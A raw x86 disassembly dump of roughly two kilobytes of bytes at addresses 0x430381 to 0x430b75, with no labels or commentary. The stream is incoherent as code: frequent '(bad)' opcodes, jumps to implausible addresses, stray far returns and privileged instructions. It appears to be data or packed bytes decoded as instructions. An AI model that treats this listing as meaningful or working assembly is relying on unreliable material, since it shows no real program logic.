  430381:	adc    BYTE PTR [ebx-0x74741bbb],al
  430387:	fsub   st,st(4)
  430389:	ret    
  43038a:	loopne 0x430327
  43038c:	xor    DWORD PTR [edx],0x31
  43038f:	cmp    edi,edi
  430391:	bswap  eax
  430393:	rol    BYTE PTR gs:[eax],0x5
  430397:	jmp    0x12e04e1
  43039c:	mov    eax,DWORD PTR [ebp-0x4]
  43039f:	add    BYTE PTR [eax+0xff0100],bh
  4303a5:	cld    
  4303a6:	jne    0x430425
  4303a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4303ae:	jb     0x4303b1
  4303b0:	add    BYTE PTR [eax],al
  4303b2:	push   eax
  4303b3:	fild   DWORD PTR [ebp+0x0]
  4303b6:	mov    edx,DWORD PTR [eax-0x68]
  4303b9:	inc    ebp
  4303ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4303c0:	or     bh,bh
  4303c2:	inc    ebp
  4303c3:	call   0x1272ac7
  4303c8:	jge    0x430417
  4303ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4303d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4303d6:	fwait
  4303d7:	mov    eax,0x30132
  4303dc:	lea    esi,[ebp+0x2c]
  4303df:	xor    edi,edi
  4303e1:	(bad)  
  4303e2:	call   0x1422d4f
  4303e7:	call   0x1372d77
  4303ec:	jne    0x430379
  4303ee:	xor    edi,esp
  4303f0:	add    eax,DWORD PTR [eax+0xc018d]
  4303f6:	push   DWORD PTR [eax]
  4303f8:	call   0xcc2d54
  4303fd:	enter  0x45ff,0xe0
  430401:	mov    ecx,DWORD PTR [ebp-0x28]
  430404:	xor    eax,DWORD PTR [eax]
  430406:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43040c:	(bad)  
  43040d:	xchg   ebp,eax
  43040e:	call   0x1420512
  430413:	mov    cl,0x45
  430415:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43041b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430422:	mov    edi,edi
  430424:	or     BYTE PTR [eax],cl
  430426:	inc    ebp
  430427:	test   DWORD PTR gs:[eax],eax
  43042a:	je     0x430471
  43042c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430432:	xor    edx,DWORD PTR [eax-0x73]
  430435:	push   ebp
  430436:	or     BYTE PTR [ebp+0x21007572],al
  43043c:	inc    ebp
  43043d:	loopne 0x4303ca
  43043f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430446:	int    0x0
  430448:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43044e:	inc    ebp
  43044f:	push   ebp
  430450:	cmp    ebp,eax
  430452:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430459:	cld    
  43045a:	fadd   QWORD PTR [eax+0x3b014d]
  430460:	jne    0x430492
  430462:	push   0xf8898557
  430467:	loopne 0x4304de
  430469:	inc    ebp
  43046a:	lea    eax,[ebx+0x72e8e4cc]
  430470:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430476:	jmp    0x4304ab
  430478:	mov    edi,DWORD PTR [edi+0x4572bc]
  43047e:	xor    eax,edi
  430480:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43048a:	rcl    BYTE PTR [eax-0x40],1
  43048d:	inc    ebp
  43048e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430496:	inc    ebp
  430497:	xchg   ebp,eax
  430498:	ud0    ebp,DWORD PTR [ebx]
  43049b:	inc    DWORD PTR [eax]
  43049d:	daa    
  43049e:	jbe    0x4304a0
  4304a0:	mov    dl,BYTE PTR [eax-0x80]
  4304a3:	push   ebp
  4304a4:	pop    ds
  4304a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4304a8:	inc    eax
  4304a9:	retf   
  4304aa:	inc    ebp
  4304ab:	iret   
  4304ac:	jb     0x430476
  4304ae:	mov    eax,DWORD PTR [edi]
  4304b0:	int3   
  4304b1:	inc    ebp
  4304b2:	inc    ebp
  4304b3:	add    DWORD PTR [ecx],esi
  4304b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4304bc:	xor    dh,BYTE PTR [ebx]
  4304be:	pushf  
  4304bf:	lea    ecx,[ecx+0x4d72d808]
  4304c5:	add    BYTE PTR [ebx],dh
  4304c7:	inc    ebp
  4304c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4304ce:	xor    dl,BYTE PTR [edx]
  4304d0:	add    eax,DWORD PTR [ebp-0x77]
  4304d3:	mov    eax,esp
  4304d5:	fmul   QWORD PTR [ebp-0x3d]
  4304d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4304df:	mov    DWORD PTR [ebp-0x24],eax
  4304e2:	rol    DWORD PTR [ebp-0x64],1
  4304e5:	xor    eax,edi
  4304e7:	mov    ecx,0xff858db0
  4304ec:	clc    
  4304ed:	enter  0x4d45,0x3c
  4304f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4304f8:	test   esi,edi
  4304fa:	clc    
  4304fb:	inc    DWORD PTR [ebp+0x45]
  4304fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430506:	test   DWORD PTR [ecx],esi
  430508:	clc    
  430509:	pushf  
  43050a:	inc    ebp
  43050b:	(bad)  
  43050c:	cmp    ah,bh
  43050e:	pushf  
  43050f:	inc    ebp
  430510:	mov    edx,DWORD PTR [eax-0x24]
  430513:	add    BYTE PTR [ebp+0x0],dl
  430516:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43051c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430520:	add    al,dl
  430522:	jmp    0x10406f2
  430527:	jb     0x430576
  430529:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43052f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430532:	xor    ecx,DWORD PTR [edi]
  430534:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430538:	(bad)  
  43053a:	clc    
  43053b:	int3   
  43053c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430543:	push   cs
  430544:	xor    ecx,eax
  430546:	xor    esp,ecx
  430548:	add    ebp,DWORD PTR [eax]
  43054a:	add    esi,DWORD PTR [eax]
  43054c:	(bad)  
  43054e:	retf   0x55cc
  430551:	repnz mov eax,DWORD PTR [ebp-0x10]
  430555:	(bad)  
  430556:	cli    
  430557:	fdiv   st(1),st
  430559:	test   DWORD PTR [eax+edi*8],ecx
  43055c:	dec    ebp
  43055d:	inc    ebp
  43055e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430564:	add    BYTE PTR [ebp+0x0],al
  430567:	mov    ecx,DWORD PTR [ebp-0x24]
  43056a:	mov    ecx,ebx
  43056c:	clc    
  43056d:	jne    0x43053a
  43056f:	mov    esi,0xd672d3
  430574:	into   
  430575:	into   
  430576:	scas   eax,DWORD PTR es:[edi]
  430577:	dec    ebp
  430578:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43057e:	sub    ecx,esi
  430580:	cmp    ecx,DWORD PTR [ebp+0x77]
  430583:	(bad)  
  430584:	mov    edi,eax
  430586:	mov    al,0x85
  430588:	mov    eax,edi
  43058a:	add    BYTE PTR [ebp-0x75],al
  43058d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430594:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43059a:	(bad)  
  43059c:	retf   0x559c
  43059f:	(bad)  
  4305a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4305a7:	inc    ebp
  4305a8:	add    eax,0xeb9c4d3f
  4305ad:	(bad)  
  4305ae:	mov    ecx,eax
  4305b0:	lods   al,BYTE PTR ds:[esi]
  4305b1:	test   DWORD PTR [ebp-0x8],edx
  4305b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4305b7:	mov    eax,DWORD PTR [ebx]
  4305b9:	lock add ecx,ebx
  4305bc:	bswap  esi
  4305be:	retf   0x55d1
  4305c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4305c7:	jmp    0x4305c2
  4305c9:	add    BYTE PTR ds:0xebc44d8b,al
  4305cf:	push   ebp
  4305d0:	mov    ebp,DWORD PTR [ebx]
  4305d2:	test   al,0x8b
  4305d4:	push   ebp
  4305d5:	clc    
  4305d6:	xor    ecx,ebx
  4305d8:	xor    ecx,esi
  4305da:	add    edx,ecx
  4305dc:	add    eax,DWORD PTR [edx+0xca010f]
  4305e2:	push   ebp
  4305e3:	dec    ebp
  4305e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4305ea:	stc    
  4305eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4305f1:	scas   eax,DWORD PTR es:[edi]
  4305f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4305f8:	xor    ebp,DWORD PTR [ebx]
  4305fa:	xor    edi,DWORD PTR [ebx]
  4305fc:	add    esi,DWORD PTR [edi+0x3]
  4305ff:	mov    ecx,DWORD PTR [edi]
  430601:	clc    
  430602:	retf   0x55cb
  430605:	into   
  430606:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43060d:	mov    eax,0x3376554d
  430612:	mov    esi,DWORD PTR [ebx]
  430614:	enter  0x5503,0x3
  430618:	xor    ecx,DWORD PTR [edi]
  43061a:	xor    ecx,edx
  43061c:	add    edx,DWORD PTR [ebp+0x3]
  43061f:	mov    ecx,DWORD PTR [edi]
  430621:	lock retf 0x4dfa
  430625:	stc    
  430626:	mov    ecx,DWORD PTR [eax]
  430628:	or     BYTE PTR [ebp+0x4d],cl
  43062b:	jmp    0x10706bb
  430630:	dec    ebp
  430631:	dec    ebp
  430632:	(bad)  
  430633:	mov    esp,esp
  430635:	clc    
  430636:	test   ebx,ecx
  430638:	clc    
  430639:	ror    DWORD PTR [ebp-0x2a],cl
  43063c:	mov    esi,ecx
  43063e:	in     al,dx
  43063f:	scas   eax,DWORD PTR es:[edi]
  430640:	inc    ebp
  430641:	mov    esi,DWORD PTR [ebx]
  430643:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43064a:	retf   
  43064b:	ja     0x43061b
  43064d:	mov    ebp,DWORD PTR [eax-0x48]
  430650:	dec    ebp
  430651:	xor    ecx,DWORD PTR [di+0x3]
  430655:	mov    ebp,eax
  430657:	clc    
  430658:	push   ebp
  430659:	retf   
  43065a:	mov    dl,bl
  43065c:	adc    esi,edx
  43065e:	jb     0x43062e
  430660:	add    BYTE PTR [edi-0x3b7474b3],ch
  430666:	in     al,dx
  430667:	jge    0x430634
  430669:	sub    ecx,DWORD PTR [ebp+0x3b]
  43066c:	mov    esi,DWORD PTR [edi-0x24]
  43066f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430676:	mov    BYTE PTR [ebx-0x34b20729],cl
  43067c:	mov    edx,ebx
  43067e:	in     al,dx
  43067f:	(bad)  
  430680:	ror    esi,cl
  430682:	push   ebp
  430683:	scas   eax,DWORD PTR es:[edi]
  430684:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43068a:	fwait
  43068b:	sub    esi,DWORD PTR [edx]
  43068d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430693:	lods   al,BYTE PTR ds:[esi]
  430694:	xor    esp,DWORD PTR [ebx]
  430696:	add    ecx,DWORD PTR [ebp-0x18]
  430699:	mov    edi,DWORD PTR [ebp-0x8]
  43069c:	mov    bl,cl
  43069e:	cmp    dl,bl
  4306a0:	jb     0x430670
  4306a2:	add    dh,dl
  4306a4:	dec    ebp
  4306a5:	scas   eax,DWORD PTR es:[edi]
  4306a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4306ac:	shr    DWORD PTR [ebx],cl
  4306ae:	into   
  4306af:	cmp    edx,esi
  4306b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4306b7:	dec    ebp
  4306b8:	dec    ebp
  4306b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4306bf:	retf   
  4306c0:	xor    edx,esi
  4306c2:	add    ecx,esi
  4306c4:	imul   ecx,edx
  4306c7:	mov    DWORD PTR [ebp+0x8],edx
  4306ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4306cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4306d3:	add    esi,DWORD PTR [ebx]
  4306d5:	mov    ah,0x3
  4306d7:	inc    ebp
  4306d8:	rdtsc  
  4306da:	xlat   BYTE PTR ds:[ebx]
  4306db:	pushf  
  4306dc:	jge    0x430667
  4306de:	xor    ebx,esp
  4306e0:	sub    eax,DWORD PTR [ebp-0x73]
  4306e3:	(bad)  
  4306e4:	cmp    al,al
  4306e6:	jb     0x43066d
  4306e8:	add    al,bh
  4306ea:	ror    DWORD PTR [ebp-0x7a],1
  4306ed:	xor    edi,edi
  4306ef:	add    edi,edi
  4306f1:	jmp    0x430740
  4306f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4306f9:	dec    ebp
  4306fa:	into   
  4306fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430701:	fwait
  430702:	shl    DWORD PTR [edx],cl
  430704:	retf   0x5588
  430707:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43070d:	add    eax,DWORD PTR [eax]
  43070f:	call   0x8ace5c61
  430714:	fcom   DWORD PTR [ecx]
  430716:	retf   
  430717:	jb     0x43077e
  430719:	add    ch,cl
  43071b:	dec    ebp
  43071c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430722:	dec    ebp
  430723:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430729:	jge    0x4306f9
  43072b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430731:	add    cl,dh
  430733:	dec    ebp
  430734:	dec    DWORD PTR [ebx-0x2c031b75]
  43073a:	adc    BYTE PTR [ebp+0x1],0x8b
  43073e:	add    ah,bl
  430740:	jge    0x4306ce
  430742:	push   0xffffff9b
  430744:	push   0x8b3032
  430749:	shl    BYTE PTR [ebp+0x55],0x6a
  43074d:	xor    edi,edi
  43074f:	xor    edx,DWORD PTR [ebx+eax*1]
  430752:	inc    ebp
  430753:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430759:	dec    ebp
  43075a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430760:	jbe    0x4306ed
  430762:	mov    esp,eax
  430764:	ror    bl,1
  430766:	enter  0x14ce,0xaf
  43076a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430770:	push   ebp
  430771:	retf   0x5540
  430774:	push   ebp
  430775:	mov    esi,DWORD PTR [edx-0x18]
  430778:	mov    edx,ebx
  43077a:	cld    
  43077b:	(bad)  
  43077c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430783:	sti    
  430784:	add    dh,cl
  430786:	push   0xffffff94
  430788:	call   FWORD PTR [ebx+0x3b5032d0]
  43078e:	mov    ecx,DWORD PTR [edi]
  430790:	enter  0x455e,0xff
  430794:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43079a:	xor    esi,DWORD PTR [ebx]
  43079c:	mov    DWORD PTR [ebx],0xcace0f9c
  4307a2:	aas    
  4307a3:	push   ebp
  4307a4:	inc    ebp
  4307a5:	xor    edx,esi
  4307a7:	add    edx,esi
  4307a9:	mov    eax,DWORD PTR [ebx]
  4307ab:	(bad)  
  4307ac:	jmp    0x43073a
  4307ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4307b4:	rol    ah,1
  4307b6:	mov    esi,0xf133104d
  4307bb:	mov    edx,0xff388d80
  4307c0:	mov    dh,0xd1
  4307c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4307c5:	mov    eax,DWORD PTR [edx-0x28]
  4307c8:	add    BYTE PTR [ebp-0x75],bh
  4307cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4307d2:	fwait
  4307d3:	retf   0x8632
  4307d6:	cmp    ebp,0x8
  4307d9:	call   ebx
  4307db:	inc    ebp
  4307dc:	inc    ebp
  4307dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4307e3:	mov    esi,DWORD PTR [ecx]
  4307e5:	int3   
  4307e6:	pushf  
  4307e7:	add    al,0xc7
  4307e9:	add    al,al
  4307eb:	add    bl,al
  4307ed:	(bad)  
  4307ee:	clc    
  4307ef:	int3   
  4307f0:	inc    ebp
  4307f1:	add    BYTE PTR [ecx],dh
  4307f3:	push   eax
  4307f4:	pushf  
  4307f5:	mov    edi,eax
  4307f7:	enter  0xc008,0x85
  4307fb:	aas    
  4307fc:	clc    
  4307fd:	gs inc ebp
  4307ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430805:	push   ss
  430806:	xor    ecx,DWORD PTR [ebp+0x3]
  430809:	sub    edx,DWORD PTR [ecx-0x76]
  43080c:	dec    ebp
  43080d:	add    DWORD PTR [ebx+0x88d845],ecx
  430813:	mov    esi,DWORD PTR [ebx]
  430815:	or     BYTE PTR [ebx],al
  430817:	cmp    edx,DWORD PTR [ecx-0x34]
  43081a:	dec    ebp
  43081b:	out    dx,eax
  43081c:	xor    eax,DWORD PTR [ebp+0x3]
  43081f:	mov    edx,DWORD PTR [ecx-0x28]
  430822:	dec    ebp
  430823:	add    BYTE PTR [ebx],dh
  430825:	push   0x518003
  43082a:	push   eax
  43082b:	add    BYTE PTR [ebx-0x300748b],cl
  430831:	sbb    BYTE PTR [ebp+0x45],cl
  430834:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43083a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430840:	dec    ebp
  430841:	inc    ebp
  430842:	xor    edx,esi
  430844:	add    edx,esi
  430846:	push   ecx
  430847:	(bad)  
  430848:	dec    ebp
  430849:	mov    al,ds:0xc5d83dff
  43084e:	retf   
  43084f:	(bad)  
  430850:	into   
  430851:	sub    bh,bh
  430853:	dec    esp
  430854:	adc    al,0x9c
  430856:	inc    ebp
  430857:	push   ebp
  430858:	test   DWORD PTR [edi],ecx
  43085a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430861:	jmp    0xc9bc1775
  430866:	add    cl,dl
  430868:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430872:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430878:	rol    BYTE PTR [eax],0x54
  43087b:	clc    
  43087c:	gs jb  0x430886
  43087f:	mov    eax,DWORD PTR [ebp-0x30]
  430882:	xor    al,0x40
  430884:	sub    al,0xc7
  430886:	mov    al,ah
  430888:	add    DWORD PTR [ebp+0x4534f845],eax
  43088e:	sub    al,0x80
  430890:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430897:	mov    ch,0xff
  430899:	clc    
  43089a:	add    DWORD PTR [ebp+0x60],0x3d
  43089e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4308a5:	inc    ebp
  4308a6:	dec    DWORD PTR [ebx-0x3427f701]
  4308ac:	test   esi,ecx
  4308ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4308b4:	push   eax
  4308b5:	add    DWORD PTR [ebp+0x0],eax
  4308b8:	dec    ebx
  4308ba:	or     al,0xce
  4308bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4308c3:	into   
  4308c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4308ca:	mov    esi,ecx
  4308cc:	sar    bh,0x45
  4308cf:	adc    al,0x8b
  4308d1:	clc    
  4308d2:	fadd   DWORD PTR [ebp+0x0]
  4308d5:	mov    ebp,DWORD PTR [edx+0x8]
  4308d8:	push   edi
  4308d9:	adc    BYTE PTR [eax+0x1],0x83
  4308dd:	add    al,al
  4308df:	retf   
  4308e0:	mov    ecx,esi
  4308e2:	cld    
  4308e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4308e9:	into   
  4308ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4308f0:	jne    0x430925
  4308f2:	inc    DWORD PTR [ebx]
  4308f4:	rcl    BYTE PTR [ecx+0x50],1
  4308f7:	push   eax
  4308f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4308fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430905:	sar    bh,0x84
  430908:	or     BYTE PTR [ebx],al
  43090a:	push   eax
  43090b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430911:	pushf  
  430912:	xor    edi,eax
  430914:	pushf  
  430915:	mov    ah,0x89
  430917:	test   esp,ebp
  430919:	clc    
  43091a:	inc    ebp
  43091b:	inc    ebp
  43091c:	mov    DWORD PTR [eax+eax*8],esi
  43091f:	sub    al,0x32
  430921:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430928:	dec    ebp
  430929:	xor    eax,DWORD PTR gs:[edi+0x3]
  43092d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430933:	xor    eax,DWORD PTR gs:[edi+0x3]
  430937:	or     DWORD PTR [ecx+0x45ff085c],0x0
  43093e:	shl    DWORD PTR [ebp-0x380064],1
  430944:	enter  0x858d,0x60
  430948:	clc    
  430949:	inc    DWORD PTR [ebp+0x50]
  43094c:	cmp    al,0x75
  43094e:	pushf  
  43094f:	(bad)  
  430950:	(bad)  
  430951:	pop    esp
  430952:	lods   al,BYTE PTR ds:[esi]
  430953:	inc    DWORD PTR [ebp+0x4508f8ff]
  430959:	mov    edi,DWORD PTR [esi]
  43095b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430962:	test   DWORD PTR [edi-0x8],edx
  430965:	sbb    al,0x45
  430967:	add    BYTE PTR [eax],bh
  430969:	push   0x8b809c
  43096e:	loopne 0x4309b5
  430970:	push   ebp
  430971:	mov    esi,DWORD PTR [ebx]
  430973:	cld    
  430974:	add    eax,DWORD PTR [eax+0xf013b]
  43097a:	adc    al,0x0
  43097c:	add    bh,bh
  43097e:	jmp    0xc00a9b
  430983:	add    BYTE PTR [ebp+0x45],cl
  430986:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43098c:	dec    ebp
  43098d:	push   0x38033
  430992:	cmp    eax,DWORD PTR [eax]
  430994:	unpcklps xmm7,xmm0
  430997:	jne    0x430999
  430999:	dec    DWORD PTR [ebx+0x5545c818]
  43099f:	mov    DWORD PTR [ebx],esi
  4309a1:	shl    BYTE PTR [ebx],1
  4309a3:	inc    ebp
  4309a4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  4309aa:	retf   0x5575
  4309ad:	dec    DWORD PTR [ebx-0x5ba13e8]
  4309b3:	(bad)  
  4309b4:	stc    
  4309b5:	loopne 0x4309c3
  4309b7:	test   DWORD PTR [ebp-0x8],ecx
  4309ba:	xor    eax,DWORD PTR [ebp+0x3]
  4309bd:	mov    ebp,ecx
  4309bf:	rol    BYTE PTR [eax],1
  4309c1:	inc    ebp
  4309c2:	add    BYTE PTR [eax-0x7747ab3],bh
  4309c8:	clc    
  4309c9:	inc    ebp
  4309ca:	retf   
  4309cb:	mov    edx,ebx
  4309cd:	loopne 0x4309a5
  4309cf:	retf   
  4309d0:	into   
  4309d1:	into   
  4309d2:	scas   eax,DWORD PTR es:[edi]
  4309d3:	dec    ebp
  4309d4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  4309da:	sub    ecx,esi
  4309dc:	cmp    ecx,DWORD PTR [ebp+0x77]
  4309df:	(bad)  
  4309e0:	mov    edi,eax
  4309e2:	enter  0x8985,0xf8
  4309e6:	add    BYTE PTR [ebp-0x75],al
  4309e9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  4309f0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4309f6:	(bad)  
  4309f8:	retf   0x559c
  4309fb:	(bad)  
  4309fc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a03:	inc    ebp
  430a04:	add    eax,0xeb9c4d3f
  430a09:	(bad)  
  430a0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a10:	xor    ecx,DWORD PTR [ebp+0x33]
  430a13:	mov    eax,DWORD PTR [ebx]
  430a15:	in     al,dx
  430a16:	add    ecx,ebx
  430a18:	bswap  esi
  430a1a:	retf   0x55d1
  430a1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430a23:	jmp    0x430a1e
  430a25:	add    BYTE PTR ds:0xebf44d8b,al
  430a2b:	push   ebp
  430a2c:	mov    ebp,DWORD PTR [ebx]
  430a2e:	mov    eax,0x33f8558b
  430a33:	retf   
  430a34:	xor    ecx,esi
  430a36:	add    edx,ecx
  430a38:	add    eax,DWORD PTR [edx+0xca010f]
  430a3e:	push   ebp
  430a3f:	dec    ebp
  430a40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430a46:	stc    
  430a47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430a4d:	scas   eax,DWORD PTR es:[edi]
  430a4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430a54:	xor    ebp,DWORD PTR [ebx]
  430a56:	xor    edi,DWORD PTR [ebx]
  430a58:	add    esi,DWORD PTR [edi+0x3]
  430a5b:	mov    ecx,DWORD PTR [edi]
  430a5d:	clc    
  430a5e:	retf   0x55cb
  430a61:	into   
  430a62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430a69:	test   al,0x4d
  430a6b:	push   ebp
  430a6c:	jbe    0x430aa1
  430a6e:	mov    esi,DWORD PTR [ebx]
  430a70:	mov    al,0x3
  430a72:	push   ebp
  430a73:	add    esi,DWORD PTR [ebx]
  430a75:	rdpmc  
  430a77:	retf   0x5503
  430a7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a80:	dec    ebp
  430a81:	stc    
  430a82:	mov    ecx,DWORD PTR [eax]
  430a84:	or     BYTE PTR [ebp+0x4d],cl
  430a87:	jmp    0x1370b17
  430a8c:	dec    ebp
  430a8d:	dec    ebp
  430a8e:	(bad)  
  430a8f:	mov    esp,esp
  430a91:	clc    
  430a92:	test   ebx,ecx
  430a94:	clc    
  430a95:	ror    DWORD PTR [ebp-0x2a],cl
  430a98:	mov    esi,ecx
  430a9a:	lock scas eax,DWORD PTR es:[edi]
  430a9c:	inc    ebp
  430a9d:	mov    esi,DWORD PTR [ebx]
  430a9f:	hlt    
  430aa0:	pushf  
  430aa1:	jge    0x430a2e
  430aa3:	sub    esp,esp
  430aa5:	cmp    ecx,ebx
  430aa7:	ja     0x430a77
  430aa9:	mov    ebp,DWORD PTR [eax-0x58]
  430aac:	dec    ebp
  430aad:	xor    ecx,DWORD PTR [di+0x3]
  430ab1:	mov    ebp,eax
  430ab3:	clc    
  430ab4:	push   ebp
  430ab5:	retf   
  430ab6:	mov    dl,bl
  430ab8:	adc    esi,edx
  430aba:	jb     0x430a8a
  430abc:	add    BYTE PTR [edi-0xb7474b3],ch
  430ac2:	lock jge 0x430a90
  430ac5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430ac8:	mov    esi,DWORD PTR [edi-0x28]
  430acb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430ad2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430ad8:	mov    edx,ebx
  430ada:	lock (bad) 
  430adc:	ror    esi,cl
  430ade:	push   ebp
  430adf:	scas   eax,DWORD PTR es:[edi]
  430ae0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430ae6:	fwait
  430ae7:	sub    esi,DWORD PTR [edx]
  430ae9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430af0:	xor    esp,DWORD PTR [ebx]
  430af2:	add    ecx,DWORD PTR [ebp-0x18]
  430af5:	mov    edi,DWORD PTR [ebp-0x8]
  430af8:	mov    bl,cl
  430afa:	cmp    dl,bl
  430afc:	jb     0x430acc
  430afe:	add    dh,dl
  430b00:	dec    ebp
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b08:	shr    DWORD PTR [ebx],cl
  430b0a:	into   
  430b0b:	cmp    edx,esi
  430b0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b13:	dec    ebp
  430b14:	dec    ebp
  430b15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b1b:	retf   
  430b1c:	xor    edx,esi
  430b1e:	add    ecx,esi
  430b20:	imul   ecx,edx
  430b23:	mov    DWORD PTR [ebp+0x8],edx
  430b26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430b29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430b2f:	add    esi,DWORD PTR [ebx]
  430b31:	rol    BYTE PTR [ebx],0x45
  430b34:	rdtsc  
  430b36:	xlat   BYTE PTR ds:[ebx]
  430b37:	pushf  
  430b38:	jge    0x430ac3
  430b3a:	xor    ebx,eax
  430b3c:	sub    eax,DWORD PTR [ebp-0x73]
  430b3f:	(bad)  
  430b40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430b47:	dec    ebp
  430b48:	xchg   BYTE PTR [ebx],dh
  430b4a:	inc    DWORD PTR [ebx]
  430b4c:	(bad)  
  430b4d:	jmp    0x430b9c
  430b4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430b55:	dec    ebp
  430b56:	into   
  430b57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430b5d:	fwait
  430b5e:	shl    DWORD PTR [edx],cl
  430b60:	retf   0x5588
  430b63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430b69:	add    eax,DWORD PTR [eax]
  430b6b:	call   0x8ace60bd
  430b70:	fcom   QWORD PTR [ecx]
  430b72:	retf   
  430b73:	jb     0x430bda
  430b75:	add    ch,cl
